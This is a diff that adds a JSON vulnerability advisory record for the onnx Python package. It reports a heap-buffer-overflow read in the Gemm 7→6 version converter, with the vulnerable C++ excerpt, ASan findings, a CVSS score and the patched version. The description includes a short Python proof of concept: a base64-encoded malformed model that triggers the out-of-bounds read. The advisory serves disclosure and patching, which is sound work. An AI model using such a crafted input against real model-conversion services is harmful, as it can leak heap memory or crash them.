@@ -1,0 +1,59 @@
+{
+  "Severity": "LOW",
+  "UpdatedAt": "2026-07-24T15:48:05Z",
+  "Package": {
+    "Ecosystem": "PIP",
+    "Name": "onnx"
+  },
+  "Advisory": {
+    "DatabaseId": 391838,
+    "Id": "GSA_kwCzR0hTQS1wODkzLXJ2cTktMnhmOc4ABfqe",
+    "GhsaId": "GHSA-p893-rvq9-2xf9",
+    "References": [
+      {
+        "Url": "https://github.com/onnx/onnx/security/advisories/GHSA-p893-rvq9-2xf9"
+      },
+      {
+        "Url": "https://github.com/onnx/onnx/pull/7880"
+      },
+      {
+        "Url": "https://github.com/onnx/onnx/commit/e9c74f596eaa0250f89e52a54160a25bbcb25b66"
+      },
+      {
+        "Url": "https://github.com/onnx/onnx/releases/tag/v1.22.0"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-p893-rvq9-2xf9"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-p893-rvq9-2xf9"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-63632"
+      }
+    ],
+    "Description": "### Summary\n\nHeap-buffer-overflow READ (16 bytes) in `Gemm_7_6::adapt_gemm_7_6()` (`onnx/version_converter/adapters/gemm_7_6.h:41`) when `ConvertVersion()` processes a model with a Gemm node whose input tensors have fewer than 2 dimensions. The adapter accesses `B_shape[1]` without checking rank. On Release builds the OOB read is silent; ASan confirms 16-byte read past a 48-byte allocation.\n\n### Details\n\nThe Gemm 7→6 downgrade adapter reads input shapes without bounds checking:\n```cpp\n// gemm_7_6.h:26-42\nconst auto\u0026 A_shape = inputs[0]-\u003esizes();  // May have \u003c 2 elements\nconst auto\u0026 B_shape = inputs[1]-\u003esizes();  // May have \u003c 2 elements\n\nif (node-\u003ehasAttribute(ktransB) \u0026\u0026 node-\u003ei(ktransB) == 1) {\n    MN.emplace_back(B_shape[0]);   // OOB if B has 0 dims\n} else {\n    MN.emplace_back(B_shape[1]);   // OOB if B has \u003c 2 dims ← CRASH\n}\n```\n\nThe PoC has input B with shape `[28]` (1 dimension). `B_shape` has 1 element. Accessing `B_shape[1]` reads 16 bytes past the `std::vector\u003cDimension\u003e` internal storage into adjacent heap memory.\n\nThe same unchecked pattern applies to `A_shape[0]` and `A_shape[1]` at lines 34 and 36.\n\n**Entry point:** `onnx.version_converter.convert_version(model, 6)` — different from the `InferShapes` bugs reported in separate advisories. This triggers during opset downgrade (7→6).\n\n### PoC\n```python\nimport base64\nimport onnx\nfrom onnx import version_converter\n\npoc_b64 = \"CAM6rwEKUQoBQQoBQgoBQRIBWSIER2VtbSoPCgVhbHBoYRUBAQA+oAEBKg4KBGJldGEVAAAAOqABASoNCgZ0dGZsc0EYAaABAioNCgZ0cmFuc0IYAKABAhIKb2Vpdl94bWZ2aFoTCgFBEg4KDAgBEggKAggCCgIIA1oTCgFCEg4KDAgBEggKAggcCgIIBFoPCgFCEgoKCAgBEgQKAggbYhMKAVkSDgoMCAESCAoCCAIKAggEQgQKABAH\"\n\nmodel = onnx.load_from_string(base64.b64decode(poc_b64))\n\n# Triggers heap-buffer-overflow in Gemm_7_6 adapter\nversion_converter.convert_version(model, 6)\n```\n\n186-byte PoC. ASan confirms: `heap-buffer-overflow READ of size 16` at `gemm_7_6.h:41`, `0 bytes after 48-byte region` allocated in `tensorShapeProtoToDimensions` at `ir_pb_converter.cc:216`.\n\n### Impact\n\nAny application that uses `onnx.version_converter.convert_version()` on untrusted models is vulnerable. This includes model conversion pipelines and tools that auto-downgrade opset versions for compatibility. On Release builds the OOB read is silent — the read value propagates into the converted model's output shape, potentially leaking heap data. On ASan builds it's detected as a heap-buffer-overflow. Could also cause crashes with different heap layouts.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-07-24T15:48:04Z",
+    "Severity": "LOW",
+    "Summary": "ONNX: Heap-Buffer-Overflow READ in Gemm Version Converter Adapter via Undersized Input Shape",
+    "UpdatedAt": "2026-07-24T15:48:05Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 3.3,
+      "VectorString": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:L"
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "1.22.0"
+      },
+      "VulnerableVersionRange": "\u003e= 1.3.0, \u003c= 1.21.0"
+    }
+  ]
+}
